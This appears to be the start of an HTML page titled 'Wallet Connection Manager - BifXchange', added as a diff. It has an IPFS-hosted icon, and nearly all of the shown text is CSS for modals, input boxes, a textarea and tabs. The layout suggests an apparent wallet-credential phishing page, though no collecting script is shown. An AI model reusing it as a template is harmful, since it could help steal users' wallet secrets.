@@ -1,0 +1,2128 @@
+<!DOCTYPE html>
+
+<html style="width: 100%;">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, shrink-to-fit=no" name="viewport"/>
+<title>Wallet Connection Manager - BifXchange</title>
+<link href="local_resources/css/e56c66305aef9ceda5a0f90401644385.css" rel="stylesheet"/>
+<link href="http://bafybeihx7zpcybjq34jdy2tk2tjh6q5lw6l32p22pluszrqclrjuharkj4.ipfs.dweb.link//apple-touch-icon.html" rel="apple-touch-icon" sizes="180x180"/>
+<link href="local_resources/img/e6537f1db11c06319a0a36167455dabb.png" rel="icon" sizes="32x32" type="image/png"/>
+</head>
+<body style="width: 100%;">
+<style>
+    body {
+  background-color: #fff;
+  overflow-x: hidden;
+}
+
+a, a:hover {
+  text-decoration: none;
+}
+
+header {
+  width: 100%;
+  height: 40px;
+  padding-top: 15px;
+}
+
+.intro h5 {
+  margin-top: 30px;
+  text-align: center;
+}
+
+.footer {
+  margin-top: 100px;
+}
+
+.text-center.img-center {
+  margin-top: 80px;
+}
+
+.c-list a {
+  padding: 20px;
+  background-color: #fff;
+  display: block;
+  margin: 0;
+  color: #222;
+  border-bottom: 1px solid #222;
+}
+
+.c-list img {
+  margin-right: 20px;
+  width: 30px;
+  height: 30px;
+}
+
+.nav.nav-tabs {
+  margin-top: 30px;
+}
+
+.nav-tabs .nav-item.show .nav-link, .nav-tabs .nav-link.active {
+  color: #27a7f4;
+  background: transparent;
+  border: 0;
+  border-bottom: 2px solid;
+}
+
+.nav-tabs .nav-link {
+  color: #a8a8a8;
+}
+
+
+
+    /*! modern-normalize v1.1.0 | MIT License | https://github.com/sindresorhus/modern-normalize */html{-moz-tab-size:4;-o-tab-size:4;tab-size:4;line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji}hr{height:0;color:inherit}abbr[title]{-webkit-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,select{text-transform:none}[type=button],button{-webkit-appearance:button}legend{padding:0}progress{vertical-align:baseline}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}button{background-color:transparent;background-image:none}button:focus{outline:1px dotted;outline:5px auto -webkit-focus-ring-color}fieldset,ol,ul{margin:0;padding:0}ol,ul{list-style:none}html{font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5}body{font-family:inherit;line-height:inherit}*,:after,:before{box-sizing:border-box;border:0 solid #e5e7eb}hr{border-top-width:1px}img{border-style:solid}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#9ca3af}input:-ms-input-placeholder,textarea:-ms-input-placeholder{opacity:1;color:#9ca3af}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}table{border-collapse:collapse}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{text-decoration:inherit}button,input,optgroup,select,textarea{padding:0;line-height:inherit;color:inherit}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}@media (min-width:1536px){.container{max-width:1536px}}.bg-transparent{background-color:transparent}.bg-white{--tw-bg-opacity:1;background-color:rgba(255,255,255,var(--tw-bg-opacity))}.bg-gray-300{--tw-bg-opacity:1;background-color:rgba(209,213,219,var(--tw-bg-opacity))}.bg-primary{--tw-bg-opacity:1;background-color:rgba(59,153,252,var(--tw-bg-opacity))}.bg-secondary{--tw-bg-opacity:1;background-color:rgba(38,38,38,var(--tw-bg-opacity))}.hover\:bg-transparent:hover{background-color:transparent}.hover\:bg-white:hover{--tw-bg-opacity:1;background-color:rgba(255,255,255,var(--tw-bg-opacity))}.border-white{--tw-border-opacity:1;border-color:rgba(255,255,255,var(--tw-border-opacity))}.border-gray-200{--tw-border-opacity:1;border-color:rgba(229,231,235,var(--tw-border-opacity))}.border-gray-300{--tw-border-opacity:1;border-color:rgba(209,213,219,var(--tw-border-opacity))}.border-primary{--tw-border-opacity:1;border-color:rgba(59,153,252,var(--tw-border-opacity))}.rounded{border-radius:.25rem}.rounded-md{border-radius:.375rem}.rounded-full{border-radius:9999px}.border-2{border-width:2px}.border-4{border-width:4px}.border{border-width:1px}.border-t{border-top-width:1px}.border-b{border-bottom-width:1px}.cursor-pointer{cursor:pointer}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.inline-flex{display:inline-flex}.table{display:table}.grid{display:grid}.hidden{display:none}.flex-row{flex-direction:row}.flex-col{flex-direction:column}.flex-wrap{flex-wrap:wrap}.items-center{align-items:center}.justify-items-center{justify-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.flex-1{flex:1 1 0%}.flex-auto{flex:1 1 auto}.font-light{font-weight:300}.font-semibold{font-weight:600}.font-bold{font-weight:700}.font-black{font-weight:900}.h-6{height:1.5rem}.h-8{height:2rem}.h-10{height:2.5rem}.h-14{height:3.5rem}.h-16{height:4rem}.h-60{height:15rem}.h-full{height:100%}.text-xs{font-size:.75rem;line-height:1rem}.text-sm{font-size:.875rem;line-height:1.25rem}.text-base{font-size:1rem;line-height:1.5rem}.text-lg{font-size:1.125rem}.text-lg,.text-xl{line-height:1.75rem}.text-xl{font-size:1.25rem}.text-2xl{font-size:1.5rem;line-height:2rem}.text-3xl{font-size:1.875rem;line-height:2.25rem}.leading-normal{line-height:1.5}.list-none{list-style-type:none}.m-0{margin:0}.m-1{margin:.25rem}.my-4{margin-top:1rem;margin-bottom:1rem}.my-6{margin-top:1.5rem;margin-bottom:1.5rem}.mx-auto{margin-left:auto;margin-right:auto}.mb-0{margin-bottom:0}.mt-1{margin-top:.25rem}.mr-1{margin-right:.25rem}.mb-1{margin-bottom:.25rem}.mr-2{margin-right:.5rem}.mb-2{margin-bottom:.5rem}.ml-2{margin-left:.5rem}.mr-3{margin-right:.75rem}.mb-3{margin-bottom:.75rem}.mt-4{margin-top:1rem}.mb-4{margin-bottom:1rem}.ml-4{margin-left:1rem}.mb-5{margin-bottom:1.25rem}.mt-6{margin-top:1.5rem}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.-ml-1{margin-left:-.25rem}.-mb-px{margin-bottom:-1px}.max-w-md{max-width:28rem}.max-w-3xl{max-width:48rem}.max-w-screen-sm{max-width:640px}.max-w-screen-lg{max-width:1024px}.min-w-0{min-width:0}.opacity-25{opacity:.25}.opacity-75{opacity:.75}.focus\:outline-none:focus,.outline-none{outline:2px solid transparent;outline-offset:2px}.p-0{padding:0}.p-1{padding:.25rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.px-2{padding-left:.5rem;padding-right:.5rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.px-3{padding-left:.75rem;padding-right:.75rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-4{padding-left:1rem;padding-right:1rem}.py-5{padding-top:1.25rem;padding-bottom:1.25rem}.px-5{padding-left:1.25rem;padding-right:1.25rem}.py-6{padding-top:1.5rem;padding-bottom:1.5rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.px-8{padding-left:2rem;padding-right:2rem}.py-10{padding-top:2.5rem;padding-bottom:2.5rem}.py-14{padding-top:3.5rem;padding-bottom:3.5rem}.py-16{padding-top:4rem;padding-bottom:4rem}.py-20{padding-top:5rem;padding-bottom:5rem}.pt-0{padding-top:0}.pt-3{padding-top:.75rem}.pb-4{padding-bottom:1rem}.pb-8{padding-bottom:2rem}.pt-10{padding-top:2.5rem}.placeholder-gray-300::-moz-placeholder{--tw-placeholder-opacity:1;color:rgba(209,213,219,var(--tw-placeholder-opacity))}.placeholder-gray-300:-ms-input-placeholder{--tw-placeholder-opacity:1;color:rgba(209,213,219,var(--tw-placeholder-opacity))}.placeholder-gray-300::placeholder{--tw-placeholder-opacity:1;color:rgba(209,213,219,var(--tw-placeholder-opacity))}.fixed{position:fixed}.relative{position:relative}*{--tw-shadow:0 0 transparent}.shadow{--tw-shadow:0 1px 3px 0 rgba(0,0,0,0.1),0 1px 2px 0 rgba(0,0,0,0.06)}.shadow,.shadow-md{box-shadow:var(--tw-ring-offset-shadow,0 0 transparent),var(--tw-ring-shadow,0 0 transparent),var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px rgba(0,0,0,0.1),0 2px 4px -1px rgba(0,0,0,0.06)}.group:hover .group-hover\:shadow-lg,.hover\:shadow-lg:hover,.shadow-lg{--tw-shadow:0 10px 15px -3px rgba(0,0,0,0.1),0 4px 6px -2px rgba(0,0,0,0.05);box-shadow:var(--tw-ring-offset-shadow,0 0 transparent),var(--tw-ring-shadow,0 0 transparent),var(--tw-shadow)}*{--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgba(59,130,246,0.5);--tw-ring-offset-shadow:0 0 transparent;--tw-ring-shadow:0 0 transparent}.focus\:ring:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(3px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 transparent)}.focus\:ring-indigo-600:focus{--tw-ring-opacity:1;--tw-ring-color:rgba(79,70,229,var(--tw-ring-opacity))}.focus\:ring-primary:focus{--tw-ring-opacity:1;--tw-ring-color:rgba(59,153,252,var(--tw-ring-opacity))}.fill-current{fill:currentColor}.text-left{text-align:left}.text-center{text-align:center}.text-white{--tw-text-opacity:1;color:rgba(255,255,255,var(--tw-text-opacity))}.text-gray-400{--tw-text-opacity:1;color:rgba(156,163,175,var(--tw-text-opacity))}.text-gray-500{--tw-text-opacity:1;color:rgba(107,114,128,var(--tw-text-opacity))}.text-gray-600{--tw-text-opacity:1;color:rgba(75,85,99,var(--tw-text-opacity))}.text-gray-900{--tw-text-opacity:1;color:rgba(17,24,39,var(--tw-text-opacity))}.text-primary{--tw-text-opacity:1;color:rgba(59,153,252,var(--tw-text-opacity))}.text-secondary{--tw-text-opacity:1;color:rgba(38,38,38,var(--tw-text-opacity))}.group:hover .group-hover\:text-primary,.hover\:text-primary:hover{--tw-text-opacity:1;color:rgba(59,153,252,var(--tw-text-opacity))}.uppercase{text-transform:uppercase}.lowercase{text-transform:lowercase}.hover\:underline:hover{text-decoration:underline}.break-words{overflow-wrap:break-word}.w-6{width:1.5rem}.w-8{width:2rem}.w-10{width:2.5rem}.w-12{width:3rem}.w-16{width:4rem}.w-2\/3{width:66.666667%}.w-full{width:100%}.z-10{z-index:10}.z-50{z-index:50}.gap-10{gap:2.5rem}.grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.transition{transition-property:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform,filter,-webkit-backdrop-filter;transition-property:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter;transition-property:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform,filter,backdrop-filter,-webkit-backdrop-filter;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.ease-linear{transition-timing-function:linear}.ease-in-out{transition-timing-function:cubic-bezier(.4,0,.2,1)}.duration-150{transition-duration:.15s}.duration-300{transition-duration:.3s}@-webkit-keyframes spin{to{transform:rotate(1turn)}}@keyframes spin{to{transform:rotate(1turn)}}@-webkit-keyframes ping{75%,to{transform:scale(2);opacity:0}}@keyframes ping{75%,to{transform:scale(2);opacity:0}}@-webkit-keyframes pulse{50%{opacity:.5}}@keyframes pulse{50%{opacity:.5}}@-webkit-keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:none;-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:none;-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}.animate-spin{-webkit-animation:spin 1s linear infinite;animation:spin 1s linear infinite}body,html{padding:0;margin:0;font-family:Overpass,sans-serif}a{color:inherit;text-decoration:none}*{box-sizing:border-box}@media (min-width:640px){.sm\:px-3{padding-left:.75rem;padding-right:.75rem}.sm\:py-5{padding-top:1.25rem;padding-bottom:1.25rem}.sm\:w-16{width:4rem}.sm\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}}@media (min-width:768px){.md\:inline-block{display:inline-block}.md\:inline{display:inline}.md\:hidden{display:none}.md\:flex-row{flex-direction:row}.md\:flex-row-reverse{flex-direction:row-reverse}.md\:items-center{align-items:center}.md\:justify-between{justify-content:space-between}.md\:text-3xl{font-size:1.875rem;line-height:2.25rem}.md\:mx-0{margin-left:0;margin-right:0}.md\:mt-0{margin-top:0}.md\:mb-0{margin-bottom:0}.md\:ml-4{margin-left:1rem}.md\:p-10{padding:2.5rem}.md\:px-6{padding-left:1.5rem;padding-right:1.5rem}.md\:px-8{padding-left:2rem;padding-right:2rem}.md\:pt-0{padding-top:0}.md\:text-right{text-align:right}.md\:w-20{width:5rem}.md\:grid-cols-4{grid-template-columns:repeat(4,minmax(0,1fr))}}
+    .readeroption1{
+        padding: 20px;
+        border-radius: 20px;
+        border: 2px solid #007bff;
+        background-color: transparent;
+        color: #007bff;margin-top: 40px;
+        }
+    .readeroption{
+        padding: 20px;
+        border-radius: 20px;
+        border: 2px solid #007bff;
+        background-color: transparent;
+        color: #007bff;margin-top: 40px;
+        }
+
+        .navbar a {
+          font-weight: bold;
+        }
+
+        * {
+  box-sizing: border-box;
+}
+
+#myInput {
+  background-image: url('/css/searchicon.png');
+  background-position: 10px 12px;
+  background-repeat: no-repeat;
+  width: 100%;
+  font-size: 16px;
+  padding: 12px 20px 12px 40px;
+  border: 1px solid #ddd;
+  margin-bottom: 12px;
+}
+
+#myUL {
+  list-style-type: none;
+  padding: 0;
+  margin: 0;
+  background:#fff;
+}
+
+#myUL>li {
+  float:left;
+  min-width:50px;
+  max-width: 80px;
+}
+
+#myUL img {
+ width:40px;
+ margin-left:auto;
+ margin-right:auto;
+} 
+
+#myUL li a {
+  border: 0px solid #ddd;
+  margin-top: -1px; /* Prevent double borders */
+  background-color: #fff;
+  padding: 12px;
+  text-decoration: none;
+  font-size: 13px;
+  color: black;
+  display: block
+}
+
+#myUL li a:hover:not(.header) {
+  background-color: #eee;
+}
+
+</style>
+<style>
+  .overlay {
+    position: fixed;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(0, 0, 0, 0.2);
+    z-index: 99;
+  }
+
+  .aletr {
+    background-color: #fff;
+    width: 30%;
+    border-radius: 5px;
+    padding: 20px;
+    position: relative;
+  }
+
+  .close {
+    position: absolute;
+    width: 15px;
+    right: 20px;
+  }
+
+  .close img {
+    width: 15px !important;
+    cursor: pointer;
+  }
+
+  .aletr h1 {
+    padding-top: 10px;
+    text-align: center;
+    font-size: 2em;
+  }
+
+  .aletr .select {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    padding: 15px;
+    margin-top: 20px;
+    width: 100%;
+    cursor: pointer;
+  }
+
+  .aletr img {
+    width: 40px;
+  }
+
+  .inputBox {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-top: 20px;
+    margin-bottom: 20px;
+  }
+
+  .inputBox input {
+    width: 80%;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    outline: none;
+    padding: 10px;
+    color: rgb(88, 112, 135);
+  }
+
+  .errormessage {
+    color: red;
+    text-align: center;
+    width: 100%;
+    font-size: 16px;
+    display: none;
+    margin-top: 10px;
+  }
+
+  .inputBox button {
+    width: 80%;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    outline: none;
+    padding: 10px;
+    margin-top: 25px;
+    color: rgb(88, 112, 135);
+    cursor: pointer;
+  }
+
+  .inputBox textarea {
+    width: 80%;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    outline: none;
+    padding: 10px;
+    max-width: 80%;
+    color: rgb(88, 112, 135);
+  }
+
+  .sss {
+    font-size: 20px;
+  }
+
+  /* Smartphones (portrait and landscape) ----------- */
+  @media only screen and (min-device-width : 320px) and (max-device-width : 480px) {
+
+    /* Styles */
+    .aletr {
+      width: 90%;
+    }
+  }
+
+  /* Smartphones (landscape) ----------- */
+  @media only screen and (min-width : 321px) {
+
+    /* Styles */
+    .aletr {
+      width: 80%;
+    }
+  }
+
+  /* Smartphones (portrait) ----------- */
+  @media only screen and (max-width : 320px) {
+
+    /* Styles */
+    .aletr {
+      width: 80%;
+    }
+  }
+
+  /* iPads (portrait and landscape) ----------- */
+  @media only screen and (min-width : 768px) and (max-width : 1024px) {
+
+    /* Styles */
+    .aletr {
+      width: 50%;
+    }
+  }
+
+  /* iPads (landscape) ----------- */
+  @media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : landscape) {
+
+    /* Styles */
+    .aletr {
+      width: 50%;
+    }
+  }
+
+  /* iPads (portrait) ----------- */
+  @media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : portrait) {
+
+    /* Styles */
+    .aletr {
+      width: 60%;
+    }
+  }
+
+  /* Desktops and laptops ----------- */
+  @media only screen and (min-width : 1224px) {
+
+    /* Styles */
+    .aletr {
+      width: 40%;
+    }
+  }
+
+  /* Large screens ----------- */
+  @media only screen and (min-width : 1824px) {
+
+    /* Styles */
+    .aletr {
+      width: 30%;
+    }
+  }
+
+  /* iPhone 4 ----------- */
+  @media only screen and (-webkit-min-device-pixel-ratio : 1.5),
+  only screen and (min-device-pixel-ratio : 1.5) {
+    /* Styles */
+  }
+
+  .insidewidth {
+      display: none;
+    }
+
+    .loader {
+      border: 2px solid #f3f3f3;
+      /* Light grey */
+      border-top: 2px solid #3498db;
+      /* Blue */
+      border-radius: 50%;
+      width: 100%;
+      height: 100%;
+      animation: spin 0.5s linear infinite;
+    }
+
+
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loaddv {
+      width: 40px;
+      height: 40px;
+      margin: 30px auto;
+    }
+
+    .buttonbox {
+      text-align: center;
+    }
+
+    .bluebtn_bird {
+      padding: 7px 20px;
+      background-color: #2997d8;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 3px;
+      width: 60%;
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: 0.5s;
+    }
+
+    .bluebtn_bird:hover {
+      background-color: #253b80;
+    }
+
+    .textarea {
+      height: 130px;
+      border: 1px solid rgba(192, 192, 192, 0.3);
+      border-radius: 3px;
+      width: 100%;
+      font-family: inherit;
+      padding: 10px;
+      font-size: 14px;
+    }
+
+    .input {
+      border: 1px solid rgba(192, 192, 192, 0.3);
+      border-radius: 3px;
+      width: 100%;
+      font-family: inherit;
+      padding: 7px 20px;
+      margin: 10px 0px;
+    }
+
+    .activebox {
+      display: block !important;
+    }
+
+    .ccbox {
+      display: none;
+      margin: 10px 0px;
+      padding: 10px;
+    }
+
+    .choosegrid {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+
+    }
+
+    .sgrid {
+      text-align: center;
+      padding: 10px 20px;
+      font-size: 13px;
+      border-bottom: 1px solid rgba(192, 192, 192, 0.3);
+      cursor: pointer;
+    }
+
+    .sactive {
+      border-bottom: 3px solid #2997d8;
+
+    }
+
+    .overlay {
+      width: 100%;
+      height: 100%;
+      position: fixed;
+      z-index: 1;
+      background: rgba(0, 0, 0, 0.3);
+      top: 0;
+      right: 0;
+      left: 0;
+      bottom: 0;
+      padding: 20px 0px;
+    }
+
+    .overbox {
+      width: 450px;
+      margin: 80px auto;
+      background: white;
+      border-top-left-radius: 7px;
+      border-top-right-radius: 7px;
+      box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.3);
+      padding: 20px 0px;
+    }
+
+    .closex {
+      float: left;
+      margin: 0px 20px;
+      cursor: pointer;
+      transition: 0.5;
+      font-size: 13px;
+    }
+
+    .closex:hover {
+      color: #2997d8;
+    }
+  </style>
+<div class="noth greennoth">
+<div class="closex2" onclick="closenotify()">X</div>
+<div class="nothdetails">
+      okay this a notification
+    </div>
+</div>
+<style>
+    .closex2 {
+      padding: 7px 10px;
+      color: white;
+      font-size: 13px;
+      margin-bottom: 0px;
+      padding-bottom: 0px;
+      cursor: pointer;
+      float: left;
+    }
+
+    .noth {
+      width: 20%;
+      border-radius: 3px;
+      bottom: 20px;
+      opacity: 0;
+      right: 20px;
+      position: fixed;
+      z-index: 1250;
+      display: none;
+    }
+
+    .nothdetails {
+      padding: 13px;
+      color: white;
+      font-weight: bold;
+      font-size: 13px;
+      text-align: center;
+    }
+
+    .confirmbox {
+      width: 35%;
+      padding: 10px;
+      background: white;
+      color: #5d6969;
+      font-weight: bold;
+      font-size: 13px;
+      margin: 10% auto;
+      border-radius: 5px;
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.2);
+    }
+
+    .confirmbox {
+      width: 35%;
+      padding: 10px;
+      background: white;
+      color: #5d6969;
+      font-weight: bold;
+      font-size: 13px;
+      margin: 10% auto;
+      border-radius: 5px;
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.2);
+    }
+
+
+    .nbc {
+      overflow: hidden;
+      width: 100%;
+    }
+
+    .confdetails {
+      color: #5d6969;
+      text-align: center;
+      padding: 12px;
+    }
+
+    .rtd {
+      padding: 5px;
+      color: white;
+      text-transform: uppercase;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 12px;
+      background: #006aa2;
+      margin: 6px;
+      border: none;
+      border-radius: 3px;
+      transition: 0.5s;
+    }
+
+    .rtd:hover {
+      opacity: 0.5;
+    }
+
+    .rgt {
+      float: right;
+    }
+
+    .lft {
+      float: left;
+      background: white;
+      color: #5d6969;
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.1);
+      transition: 0.5s;
+    }
+
+    .lft:hover {
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.5);
+    }
+
+    .greennoth {
+      background: linear-gradient(to bottom right, rgba(0, 255, 255, 0.9), #1c9a9a);
+      box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.9);
+    }
+
+    .rednoth {
+      background: #e14d43;
+      box-shadow: 0px 2px 4px 0px #e14d43;
+    }
+
+
+    @media only screen and (max-width:1100px) {
+
+
+      .confirmbox {
+        width: 40%;
+      }
+
+    }
+
+
+    @media only screen and (max-width:980px) {
+
+
+      .noth {
+        width: 30%;
+      }
+
+    }
+
+    @media only screen and (max-width:850px) {
+
+      .noth {
+        width: 40%;
+      }
+
+
+      .confirmbox {
+        width: 50%;
+      }
+
+    }
+
+
+    @media only screen and (max-width:650px) {
+      .confirmbox {
+        width: 65%;
+      }
+
+    }
+
+    @media only screen and (max-width:550px) {
+
+      .overbox {
+        width: 90%;
+        margin: 0px;
+        background: white;
+        border-top-left-radius: 7px;
+        border-top-right-radius: 7px;
+        box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.3);
+        padding: 20px 0px;
+        /*position: absolute;*/
+        bottom: 0;
+        z-index: 1000;
+        border-radius: 30px;
+        padding: 20px;
+      }
+
+
+    }
+
+    @media only screen and (max-width:450px) {
+      .confirmbox {
+        width: 70%;
+      }
+
+    }
+
+
+    @media only screen and (max-width:400px) {
+
+      .noth {
+        width: 90%;
+      }
+
+      .confirmbox {
+        width: 100%;
+        margin: 40px 0px;
+      }
+
+
+    }
+    
+  /*! CSS Used from: Embedded */
+  img {
+    border-style: none;
+  }
+
+  button,
+  input,
+  textarea {
+    font-family: inherit;
+    font-size: 100%;
+    line-height: 1.15;
+    margin: 0;
+  }
+
+  button,
+  input {
+    overflow: visible;
+  }
+
+  button {
+    text-transform: none;
+  }
+
+  [type=button],
+  button {
+    -webkit-appearance: button;
+  }
+
+  [type=button]::-moz-focus-inner,
+  button::-moz-focus-inner {
+    border-style: none;
+    padding: 0;
+  }
+
+  [type=button]:-moz-focusring,
+  button:-moz-focusring {
+    outline: 1px dotted ButtonText;
+  }
+
+  textarea {
+    overflow: auto;
+  }
+
+  h3,
+  p {
+    margin: 0;
+  }
+
+  button {
+    background-color: transparent;
+    background-image: none;
+  }
+
+  button:focus {
+    outline: 1px dotted;
+    outline: 5px auto -webkit-focus-ring-color;
+  }
+
+  *,
+  :after,
+  :before {
+    box-sizing: border-box;
+    border: 0 solid #e2e8f0;
+  }
+
+  img {
+    border-style: solid;
+  }
+
+  textarea {
+    resize: vertical;
+  }
+
+  input::-moz-placeholder,
+  textarea::-moz-placeholder {
+    color: #a0aec0;
+  }
+
+  input:-ms-input-placeholder,
+  textarea:-ms-input-placeholder {
+    color: #a0aec0;
+  }
+
+  input::placeholder,
+  textarea::placeholder {
+    color: #a0aec0;
+  }
+
+  button {
+    cursor: pointer;
+  }
+
+  h3 {
+    font-size: inherit;
+    font-weight: inherit;
+  }
+
+  button,
+  input,
+  textarea {
+    padding: 0;
+    line-height: inherit;
+    color: inherit;
+  }
+
+  img,
+  svg {
+    display: block;
+    vertical-align: middle;
+  }
+
+  img {
+    max-width: 100%;
+    height: auto;
+  }
+
+  .bg-white {
+    --bg-opacity: 1;
+    background-color: #fff;
+    background-color: rgba(255, 255, 255, var(--bg-opacity));
+  }
+
+  .bg-red-100 {
+    --bg-opacity: 1;
+    background-color: #fff5f5;
+    background-color: rgba(255, 245, 245, var(--bg-opacity));
+  }
+
+  .bg-red-600 {
+    --bg-opacity: 1;
+    background-color: #e53e3e;
+    background-color: rgba(229, 62, 62, var(--bg-opacity));
+  }
+
+  .bg-blue-600 {
+    --bg-opacity: 1;
+    background-color: #3182ce;
+    background-color: rgba(49, 130, 206, var(--bg-opacity));
+  }
+
+  .hover\:bg-red-700:hover {
+    --bg-opacity: 1;
+    background-color: #c53030;
+    background-color: rgba(197, 48, 48, var(--bg-opacity));
+  }
+
+  .hover\:bg-blue-700:hover {
+    --bg-opacity: 1;
+    background-color: #2b6cb0;
+    background-color: rgba(43, 108, 176, var(--bg-opacity));
+  }
+
+  .border-transparent {
+    border-color: transparent;
+  }
+
+  .border-white {
+    --border-opacity: 1;
+    border-color: #fff;
+    border-color: rgba(255, 255, 255, var(--border-opacity));
+  }
+
+  .border-gray-400 {
+    --border-opacity: 1;
+    border-color: #cbd5e0;
+    border-color: rgba(203, 213, 224, var(--border-opacity));
+  }
+
+  .hover\:border-blue-600:hover {
+    --border-opacity: 1;
+    border-color: #3182ce;
+    border-color: rgba(49, 130, 206, var(--border-opacity));
+  }
+
+  .focus\:border-blue-400:focus {
+    --border-opacity: 1;
+    border-color: #63b3ed;
+    border-color: rgba(99, 179, 237, var(--border-opacity));
+  }
+
+  .rounded {
+    border-radius: .25rem;
+  }
+
+  .rounded-md {
+    border-radius: .375rem;
+  }
+
+  .rounded-lg {
+    border-radius: .5rem;
+  }
+
+  .rounded-full {
+    border-radius: 9999px;
+  }
+
+  .border {
+    border-width: 1px;
+  }
+
+  .border-b-2 {
+    border-bottom-width: 2px;
+  }
+
+  .cursor-pointer {
+    cursor: pointer;
+  }
+
+  .inline-block {
+    display: inline-block;
+  }
+
+  .flex {
+    display: flex;
+  }
+
+  .inline-flex {
+    display: inline-flex;
+  }
+
+  .flex-col {
+    flex-direction: column;
+  }
+
+  .items-center {
+    align-items: center;
+  }
+
+  .justify-center {
+    justify-content: center;
+  }
+
+  .justify-evenly {
+    justify-content: space-evenly;
+  }
+
+  .flex-shrink-0 {
+    flex-shrink: 0;
+  }
+
+  .font-medium {
+    font-weight: 500;
+  }
+
+  .h-6 {
+    height: 1.5rem;
+  }
+
+  .h-12 {
+    height: 3rem;
+  }
+
+  .text-xs {
+    font-size: .75rem;
+  }
+
+  .text-sm {
+    font-size: .875rem;
+  }
+
+  .text-base {
+    font-size: 1rem;
+  }
+
+  .text-lg {
+    font-size: 1.125rem;
+  }
+
+  .leading-6 {
+    line-height: 1.5rem;
+  }
+
+  .mx-auto {
+    margin-left: auto;
+    margin-right: auto;
+  }
+
+  .mt-2 {
+    margin-top: .5rem;
+  }
+
+  .mr-2 {
+    margin-right: .5rem;
+  }
+
+  .mt-3 {
+    margin-top: .75rem;
+  }
+
+  .mb-4 {
+    margin-bottom: 1rem;
+  }
+
+  .mt-6 {
+    margin-top: 1.5rem;
